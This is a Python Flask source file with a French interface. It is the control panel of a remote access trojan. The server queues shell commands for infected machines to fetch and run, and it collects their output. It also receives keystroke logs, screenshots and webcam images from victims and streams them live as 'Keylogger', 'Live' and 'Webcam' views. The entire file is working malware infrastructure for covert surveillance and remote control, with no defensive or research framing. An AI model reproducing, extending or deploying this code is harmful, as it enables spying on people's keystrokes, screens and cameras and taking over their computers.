from flask import (
    Flask, request, render_template_string,
    send_file, redirect, url_for, Response
)
import time

app = Flask(__name__)

# État global
commande = ""
resultat_commande = ""
destinataires = ""
mode = "cmd"        # "cmd", "live", "keys", "webcam"
last_host = ""      # hostname du dernier screenshot/webcam reçu
key_logs = ""       # journal des touches

# Template HTML
html_page = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Console, Live Screen, Keylogger & Webcam</title>
  <style>
    body { font-family: sans-serif; padding: 20px; }
    .section { margin-top: 30px; }
    #stream, #stream_webcam { max-width:90vw; border:1px solid #ccc; display:block; }
    pre { background:#f5f5f5; padding:10px; white-space: pre-wrap; }
    button { margin-right: 10px; }
  </style>
</head>
<body>
  <h1>🖥️ Contrôle à Distance III</h1>
  <div>
    <button onclick="location.href='{{ url_for('set_mode') }}?mode=cmd'" {% if mode=='cmd' %}disabled{% endif %}>⚪ Commande</button>
    <button onclick="location.href='{{ url_for('set_mode') }}?mode=live'" {% if mode=='live' %}disabled{% endif %}>🔴 Live</button>
    <button onclick="location.href='{{ url_for('set_mode') }}?mode=keys'" {% if mode=='keys' %}disabled{% endif %}>🗝️ Keylogger</button>
    <button onclick="location.href='{{ url_for('set_mode') }}?mode=webcam'" {% if mode=='webcam' %}disabled{% endif %}>🖥️ Webcam</button>
  </div>

  {% if mode == 'cmd' %}
  <div class="section">
    <h2>Console</h2>
    <form method="POST">
      <input type="text" name="commande" value="{{ commande }}" style="width:60%;" placeholder="Commande shell" />
      <button type="submit">Envoyer</button>
    </form>
    <form action="/clear_output" method="POST" style="margin-top:10px;">
      <button type="submit">Effacer résultats</button>
    </form>
    <pre>{{ resultat_commande or "(aucun)" }}</pre>
  </div>
  {% endif %}

  {% if mode == 'live' %}
  <div class="section">
    <h2>Live Screen</h2>
    <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
    <img id="stream" src="{{ url_for('mjpeg') }}" alt="Flux écran live">
  </div>
  {% endif %}

  {% if mode == 'keys' %}
  <div class="section">
    <h2>Keylogger</h2>
    <form action="/clear_keys" method="POST" style="margin-bottom:10px;">
      <button type="submit">Effacer Key Logs</button>
    </form>
    <pre>{{ key_logs or "(aucun)" }}</pre>
  </div>
  {% endif %}

  {% if mode == 'webcam' %}
  <div class="section">
    <h2>Webcam</h2>
    <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
    <img id="stream_webcam" src="{{ url_for('mjpeg_webcam') }}" alt="Flux webcam">
  </div>
  {% endif %}

</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    global commande, resultat_commande, destinataires
    if request.method == "POST":
        commande = request.form.get("commande", "").strip()
    return render_template_string(
        html_page,
        commande=commande,
        resultat_commande=resultat_commande,
        destinataires=destinataires,
        mode=mode,
        last_host=last_host,
        key_logs=key_logs
    )

@app.route("/set_mode")
def set_mode():
    global mode
    m = request.args.get("mode", "cmd")
    if m in ["cmd", "live", "keys", "webcam"]:
        mode = m
    return redirect(url_for("index"))

@app.route("/get_mode")
def get_mode():
    return mode

@app.route("/get_commande")
def get_commande():
    global commande
    tmp = commande
    commande = ""
    return tmp

@app.route("/post_resultat", methods=["POST"])
def post_resultat():
    global resultat_commande, last_host
    last_host = request.form.get('id', '')
    resultat_commande = request.form.get("resultat", "")
    return "OK", 200

@app.route("/clear_output", methods=["POST"])
def clear_output():
    global resultat_commande
    resultat_commande = ""
    return redirect(url_for("index"))

@app.route("/post_screen", methods=["POST"])
def post_screen():
    global last_host
    f = request.files.get("screen")
    mid = request.form.get("id", "").strip()
    if f and mid:
        f.save("latest_screen.png")
        last_host = mid
        return "OK", 200
    return "Bad Request", 400

@app.route("/post_webcam", methods=["POST"])
def post_webcam():
    global last_host
    f = request.files.get("webcam")
    mid = request.form.get("id", "").strip()
    if f and mid:
        f.save("latest_webcam.png")
        last_host = mid
        return "OK", 200
    return "Bad Request", 400

@app.route("/post_keys", methods=["POST"])
def post_keys():
    global key_logs, last_host
    mid = request.form.get("id", "").strip()
    keys = request.form.get("keys", "")
    if mid and keys:
        key_logs += f"\n[{mid}]\n{keys}\n"
    return "OK", 200

@app.route("/clear_keys", methods=["POST"])
def clear_keys():
    global key_logs
    key_logs = ""
    return redirect(url_for("index"))

@app.route("/screen.png")
def screen_png():
    return send_file("latest_screen.png", mimetype="image/png")

def mjpeg_generator():
    boundary = b"--frame"
    while True:
        try:
            with open("latest_screen.png", "rb") as img:
                frame = img.read()
            yield boundary + b"\r\n" + b"Content-Type: image/png\r\n\r\n" + frame + b"\r\n"
        except FileNotFoundError:
            time.sleep(0.1)
            continue
        time.sleep(0.1)

@app.route("/mjpeg")
def mjpeg():
    return Response(mjpeg_generator(), mimetype="multipart/x-mixed-replace; boundary=frame")

def mjpeg_webcam_generator():
    boundary = b"--frame"
    while True:
        try:
            with open("latest_webcam.png", "rb") as img:
                frame = img.read()
            yield boundary + b"\r\n" + b"Content-Type: image/png\r\n\r\n" + frame + b"\r\n"
        except FileNotFoundError:
            time.sleep(0.1)
            continue
        time.sleep(0.1)

@app.route("/mjpeg_webcam")
def mjpeg_webcam():
    return Response(mjpeg_webcam_generator(), mimetype="multipart/x-mixed-replace; boundary=frame")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)
